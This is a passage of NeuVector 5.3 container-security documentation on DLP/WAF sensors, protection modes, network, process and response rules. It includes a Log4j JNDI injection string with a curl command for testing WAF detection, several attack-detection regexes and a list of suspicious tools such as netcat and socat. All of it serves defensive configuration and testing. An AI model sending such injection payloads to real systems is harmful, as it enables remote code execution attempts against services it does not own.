matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.  Download WAF test script  Sample Alerts​  DLP match in Discover or Monitor Mode    DLP match in Protect Mode    DLP Security Event Notification for Credit Card Match    note The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data.  ","version":"5.3","tagName":"h3"},{"title":"Managing WAF Rules Using Import/Export or CRDs​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/policy/dlp#managing-waf-rules-using-importexport-or-crds","content":" It is possible to import or export WAF rules from the WAF screen. This can be useful to be able to propagate rules to other clusters, make a backup, or prepare them for applying as a CRD.  In order to create WAF sensors or apply a WAF sensor to a group using CRDs, make sure the appropriate NVWafSecurityRule cluster role binding is created.  Sample WAF sensor CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvWafSecurityRule metadata: name: sensor.execution spec: sensor: comment: arbitrary command execution attempt name: sensor.execution rules: - name: Alchemy patterns: - context: url key: pattern op: regex value: \\/NUL\\/.*\\.\\.\\/\\.\\.\\/ - name: Log4j patterns: - context: header key: pattern op: regex value: \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.* - name: formmail patterns: - context: url key: pattern op: regex value: \\/formmail - context: packet key: pattern op: regex value: \\x0a - name: CCBill patterns: - context: url key: pattern op: regex value: \\/whereami\\.cgi?.*g= - name: DotNetNuke patterns: - context: url key: pattern op: regex value: \\/Install\\/InstallWizard.aspx.*executeinstall - name: HNAP patterns: - context: url key: pattern op: regex value: \\/tmUnblock.cgi - context: header key: pattern op: regex value: 'Authorization: Basic\\s*YWRtaW46' - name: Magento patterns: - context: url key: pattern op: regex value: \\/Adminhtml_.*forwarded= - name: b2 patterns: - context: url key: pattern op: regex value: \\/b2\\/b2-include\\/.*b2inc.*http\\x3a\\/\\/ - name: bat patterns: - context: url key: pattern op: regex value: x2ebat\\x22.*?\\x26 - name: eshop.pl patterns: - context: url key: pattern op: regex value: \\/eshop\\.pl?.*seite=\\x3b - name: whois_raw.cgi patterns: - context: url key: pattern op: regex value: \\/whois_raw\\.cgi? - context: packet key: pattern op: regex value: \\x0a kind: List metadata: null   Sample CRD to apply a WAF sensor to a Group  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: demo-group namespace: demo spec: egress: [] file: [] ingress: [] process: [] process_profile: baseline: default target: policymode: N/A selector: comment: &quot;&quot; criteria: - key: domain op: = value: demo - key: service op: = value: nginx-pod.demo - key: service op: = value: node-pod.demo name: demo-group original_name: &quot;&quot; waf: settings: - action: deny name: sensor.cross - action: deny name: sensor.execution - action: deny name: sensor.injection - action: deny name: sensor.traversal - action: deny name: wafsensor-1 status: true kind: List metadata: null   See the CRD section for more details on working with CRDs.  ","version":"5.3","tagName":"h3"},{"title":"DLP/WAF Response Rules​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/policy/dlp#dlpwaf-response-rules","content":" Response rules based on DLP/WAF security events can be created in Policy -&gt;Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules.   ","version":"5.3","tagName":"h3"},{"title":"Modes: Discover, Monitor, Protect","type":0,"sectionRef":"#","url":"/policy/modes","content":"","keywords":"","version":"5.3"},{"title":"NeuVector Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/policy/modes#neuvector-modes","content":" The NeuVector Violation Detection module has three modes: Discover, Monitor, and Protect. At any point in time, any Group (beginning with 'nv', or the 'Nodes' group) can be in any of these modes. The mode can be switched from the Groups menu, Network Activity view, or the Dashboard. Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line. Violations are also logged and displayed in the Notifications tab. Process profile rule and file access violations are logged into Notifications -&gt; Security Events.  In the Network map you can click on any conversation (green, yellow, red line) to display more details about the type of connection and protocol last monitored. You can also use the Search and Filter by Group buttons in the lower right to narrow the display of your containers.  Protect​  In Protect mode, NeuVector enforcers will block (deny) any network violations and attacks detected. Violations are shown in the Network map with a red ‘x’ in them, meaning they have been blocked. Unauthorized processes and file access will also be blocked in Protect mode. DLP sensors which match will block network connections.  ","version":"5.3","tagName":"h3"},{"title":"Switching Between Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/policy/modes#switching-between-modes","content":" You can easily switch NeuVector Groups from one mode to another. Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.    Conflict Resolution Between Services In Different Modes​  For network connections between containers in different service groups, if their policy modes are different, the following table shows how the system resolves the conflicts.  Source\tDestination\tEffective ModeDiscover\tMonitor\tDiscover Discover\tProtect\tDiscover Monitor\tDiscover\tDiscover Monitor\tProtect\tMonitor Protect\tDiscover\tDiscover Protect\tMonitor\tMonitor  As you can see, the effective mode always defaults to the least restrictive policy mode.  note The above applies only for Network Rules ","version":"5.3","tagName":"h3"},{"title":"Network Rules","type":0,"sectionRef":"#","url":"/policy/networkrules","content":"","keywords":"","version":"5.3"},{"title":"Policy: Network Rules​","type":1,"pageTitle":"Network Rules","url":"/policy/networkrules#policy-network-rules","content":" NeuVector automatically creates Network Rules from your running applications in Discover mode. You can also manually add them in any mode, Discover, Monitor, or Protect. Rules can be added or edited from the CLI or REST API.  NeuVector uses a declarative policy which consist of rules which govern allowed and denied application layer connections. NeuVector analyzes and protects based on not only IP address and port, but by determining the actual network behavior based on application protocols. This enables NeuVector to automatically protect any new application containers regardless of IP address and port.  Network rules specify ALLOWED or DENIED behavior for your applications. These rules determine what connections are normal behavior for your services as well as what are violations. You can delete automatically ‘learned’ rules as well as add new rules to your policy.  important Network rules are enforced in the order that they appear in the list, from top to bottom. To re-order the rules, select the rule you want to move, then you will see a 'Move to' box appear at the top, and you can move the selected rule to the position before or after a specified rule.  important If you edit (add, delete, change) rules, your changes are NOT applied until you click the Save button at the top. If you exit this page without deploying your changes, they will be lost.  Adding New RulesAdd a rule using the ‘+’ either below another rule in the right column, or using the button in the lower right.  ID  (Optional) Enter a number. Network rules are initially ordered from lowest to highest, but rule order can be changed by dragging and dropping them in the list.  From  Specify the GROUP from where the connection will originate. Start typing and NeuVector will match any previously discovered groups, as well as any new groups defined.  To  Specify the destination GROUP where these connections are allowed or denied.  Applications  Enter applications for NeuVector to allow or deny. NeuVector understands deep application behavior and will analyze the payload to determine application protocols. Protocols include HTTP, HTTPS, SSL, SSH, DNS, DNCP, NTP, TFTP, ECHO, RTSP, SIP, MySQL, Redis, Zookeeper, Cassandra, MongoDB, PostgresSQL, Kafka, Couchbase, ActiveMQ, ElasticSearch, RabbitMQ, Radius, VoltDB, Consul, Syslog, Etcd, Spark, Apache, Nginx, Jetty, NodeJS, Oracle, MSSQL, Memcached and gRPC.  note To select Any/All, leave this field blank  Ports  If there are specific ports to limit this rule to, enter them here. For ICMP traffic, enter icmp.  note To select Any/All, leave this field blank  Deny/Allow  Indicate whether this rule is to Allow this type of connection, or Deny it.  If Deny is selected, NeuVector will log this as a violation while in Monitor mode, and will block this while in Protect mode. The default action is to Deny a connection (log violation only if in Monitor mode) if no rule matches it.  Don’t forget to Deploy/Update if you make any changes!  ","version":"5.3","tagName":"h3"},{"title":"Egress Control: Allowing Connections to Trusted Internal Services on Other Networks​","type":1,"pageTitle":"Network Rules","url":"/policy/networkrules#egress-control-allowing-connections-to-trusted-internal-services-on-other-networks","content":" A common use case for customizing rules is to allow a container service to connect to a network outside of the NeuVector managed cluster’s network. In many cases, since NeuVector does not recognize this network it will classify it as an ‘External’ network, even if it is an internal network.  To allow containers to connect to services on other internal networks, first create a group, then a rule for it.  Create a Group. In Policy -&gt; Groups, click to add a new Group. Name the group (e.g. internal) then specify the criteria for the group. For example, specify the DNS name, IP address or address range of the internal services. Save the new group. Create a Rule. In Policy -&gt; Rules, click to add a new rule. Select the group representing the container From which the connections will originate, then the To group (e.g. internal). You can further refine the rule with specific protocols or ports, or leave blank. Make sure the selector is set to Allow (green).  Be sure to click Deploy to save the new rule.  Finally, review the list of rules to make sure the new rule is in the order and priority desired. Rules are applied from top to bottom.  Ingress IP Policy Based on X-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"5.3","tagName":"h3"},{"title":"Split Mode Network Protections​","type":1,"pageTitle":"Network Rules","url":"/policy/networkrules#split-mode-network-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here.  ","version":"5.3","tagName":"h3"},{"title":"Built-In Network Threat Detection​","type":1,"pageTitle":"Network Rules","url":"/policy/networkrules#built-in-network-threat-detection","content":" NeuVector automatically detects certain network attacks, regardless of protection mode. In Discover and Monitor mode, these threats will be alerted and can be found in Notifications -&gt; Security Events. In Protect mode, these will alerted as well as blocked. Response rules can be created based on threat detection as well.  Note that customized network threat detection can be configured through the WAF rules section.  NeuVector includes the following detections for threats:  Apache Struts RCE attackCipher Overflow attackDetect HTTP negative content-length buffer overflowDetect MySQL access denyDetect SSH version 1, 2 or 3Detect SSL TLS v1.0, v1.1 (requires environment variable to enable)DNS buffer overflow attackDNS flood DDOS attackDNS null type attackDNS tunneling attackDNS zone transfer attackHTTP Slowloris DDOS attackHTTP smuggling attackICMP flood attackICMP tunneling attackIP Teardrop attackKubernetes man-in-the-middle attack per CVE-2020-8554PING death attackSQL injection attackSSL heartbleed attackSYN flood attackTCP small window attackTCP split handshake attackTCP Small MSS attack ","version":"5.3","tagName":"h3"},{"title":"Security Policy Overview","type":0,"sectionRef":"#","url":"/policy/overview","content":"","keywords":"","version":"5.3"},{"title":"NeuVector Security Policy​","type":1,"pageTitle":"Security Policy Overview","url":"/policy/overview#neuvector-security-policy","content":" To detect Violations of normal behavior, NeuVector maintains a security Policy which can be managed from the GUI, CLI, CRD, or REST API.  Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential. Be sure you know the main admin login for the imported file before importing. ","version":"5.3","tagName":"h3"},{"title":"Process Profile Rules","type":0,"sectionRef":"#","url":"/policy/processrules","content":"","keywords":"","version":"5.3"},{"title":"Policy -> Groups -> Process Profile Rules​","type":1,"pageTitle":"Process Profile Rules","url":"/policy/processrules#policy---groups---process-profile-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.    Built-in Suspicious Process Detection​  The following built-in detections are automatically enabled in NeuVector.  Process\tDirection\tReported namenmap\toutgoing\tport scanner nc\toutgoing\tnetcat process ncat\toutgoing\tnetcat process netcat\toutgoing\tnetcat process sshd\tincoming\tssh from remote ssh\toutgoing\tssh to remote scp\toutgoing\tsecure copy telnet\toutgoing\ttelnet to remote in.telnetd\tincoming\ttelnet from remote iodine\toutgoing\tdns tunneling iodined\tincoming\tdns tunneling dnscat\toutgoing\tdns tunneling dns2tcpc\toutgoing\tdns tunneling dns2tcpd\tincoming\tdns tunneling socat\toutgoing\trelay process  In addition the following detections are enabled:  docker cproot privilege escalation (user role into root role)tunnel: reverse shell (triggered when stdin and stdout are redirected to the same socket)  Suspicious processes are alerted when in Discover or Monitor mode, and blocked when in Protect mode. Detection applies to containers as well as hosts, with the exception of 'sshd' which is not considered suspicious on hosts. Processes listed above can be added to the Allow List for containers (Groups) including hosts if it should be allowed.  ","version":"5.3","tagName":"h3"},{"title":"Split Mode Process/File Protections​","type":1,"pageTitle":"Process Profile Rules","url":"/policy/processrules#split-mode-processfile-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"5.3","tagName":"h3"},{"title":"Network Threat Signatures","type":0,"sectionRef":"#","url":"/policy/threats","content":"","keywords":"","version":"5.3"},{"title":"Detecting Network Threats​","type":1,"pageTitle":"Network Threat Signatures","url":"/policy/threats#detecting-network-threats","content":" NeuVector deep packet inspection can be used to inspect the network packets and payload for attacks such as those in the OWASP Top 10 and those commonly used in Web Application Firewalls (WAFs).  OWASP Signatures​  DLP Sensors can be created to detect OWASP attacks using the following pattern examples. As always, these may need to be tuned for your environment and applications.  img src=javascript /servlet/.*/org.apache. /modules.php?.*name=Wiki.*&lt;script /error/500error.jsp.*et=.*&lt;script /mailman/.*?.*info=.*&lt;script \\x0aReferer\\x3a res\\x3a/C\\x3a /cgi-bin/cgictl?action=setTaskSettings.*settings={\\x22.*taskId= /cgi-bin/cgictl.*scriptName=.*[?&amp;]scriptName=[^&amp;]*?([\\x22\\x27\\x3c\\x3e\\x28\\x29]|script|onload|src)   Here are other simple examples:    Built-In Threat Detection​  NeuVector also has built-in detection of other network threats such as SQL Injection attacks, DDoS (e.g. Ping Death), and tunneling attacks. For SQL injection attacks, NeuVector inspects the network connection (SQL protocol) between the front end and the sql database pod, reducing false positives and increasing accuracy. ","version":"5.3","tagName":"h3"},{"title":"Response Rules","type":0,"sectionRef":"#","url":"/policy/responserules","content":"","keywords":"","version":"5.3"},{"title":"Policy: Response Rules​","type":1,"pageTitle":"Response Rules","url":"/policy/responserules#policy-response-rules","content":" Response Rules provide a flexible, customizable rule engine to automate responses to important security events. Triggers can include Security Events, Vulnerability Scan results, CIS Benchmarks, Admission Control events and general Events. Actions include container quarantine, webhooks, and suppression of alerts.    Creating a new Response Rule using the following:  Group. A rule will apply to a Group. Please see the section Run-Time Security Policy -&gt; Groups for more details on Groups and how to create a new one if needed.Category. This is the type of event, such as Security Event, or CVE vulnerability scan result.Criteria. Specify one or more criteria. Each Category will have different criteria which can be applied. For example, by the event name, severity, or minimum number of high CVEs.Action. Select one or more actions. Quarantine will block all network traffic in/out of a container. Webhook requires that a webhook endpoint be defined in Settings -&gt; Configuration. Suppress log will prevent this event from being logged in Notifications.    important All Response Rules are evaluated to determine if they match the condition/criteria. If there are multiple rule matches, each action(s) will be performed. This is different than the behavior of Network Rules, which are evaluated from top to bottom and only the first rule which matches will be executed.  Additional events and actions will continue to be added by NeuVector in future releases.  ","version":"5.3","tagName":"h3"},{"title":"Detailed Configuration for Response Rules​","type":1,"pageTitle":"Response Rules","url":"/policy/responserules#detailed-configuration-for-response-rules","content":" Response Rules enable automated responses such as quarantine, webhook, and suppress log based on certain security events. Currently, the events which can be defined in the response rule include event logs, security event logs, and CVE (vulnerability scan) and CIS benchmark reports. Response rules are applied in all modes: Discover, Monitor and Protect and the behavior is same for all 3 modes.  Actions from multiple rules will be applied if an event matches multiple rules. Each rule can have multiple actions and multiple match criteria. All actions defined will be applied to containers when events match the response rule criteria. In the case there is a match for Host (not container) events, currently the actions webhook and suppress log are supported.  There are 6 default response rules included with NeuVector which are set to the status ‘disabled,’ one for each category. Users can either modify a default rule to match their requirements or create new ones. Be sure to enable any rules which should be applied.  Response Rule Parameters Matrix​    Using Multiple Criteria in a Single Rule​  The matching logic for multiple criteria in one response rule is:  For different criteria types (e.g. name:Network.Violation, name:Process.Profile.Violation) within a single rule, apply 'and'  Actions​  Quarantine – container is quarantined. Note that Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.Webhook - a webhook log generatedsuppress-log – log is suppressed - both syslog and webhook log  note Quarantine action is not applicable to rule triggered for Host eventsAction and Event parameters are mandatory; other parameters can be empty to match broader conditions.Multiple rules can match for a single log, which can result in multiple actions taken.Each rule can have multiple actions.  Creating a response rule for security event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category as security eventAdd criteria for the event log to be included as matching criteriaSelect actions to be applied Quarantine, Webhook or suppress logEnable statusThe log levels or process names can be used as other matching criteria  Sample rule to quarantine container and send webhook when package is updated in the nv.alpinepython.default container.​    Icons to manage rules - edit, delete, disable and insert new rule below​    Creating a response rule for event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose Event the categoryAdd name of the event log to be included as the matching criteriaSelect actions to be applied - Quarantine, Webhook or suppress 